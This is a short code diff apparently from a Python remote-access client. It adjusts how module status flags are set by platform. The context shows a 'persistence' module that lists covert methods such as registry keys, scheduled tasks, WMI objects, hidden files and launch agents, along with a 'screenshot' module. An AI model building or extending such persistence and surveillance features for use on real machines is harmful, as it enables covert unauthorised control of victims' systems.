@@ -759,9 +759,6 @@ class Client(object):
         return fx
 
     def module(fx, mx=__modules__):
-
-        
-        fx.status = True
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -781,7 +778,7 @@ class Client(object):
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options = {}
-
+        fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
         return fx
 
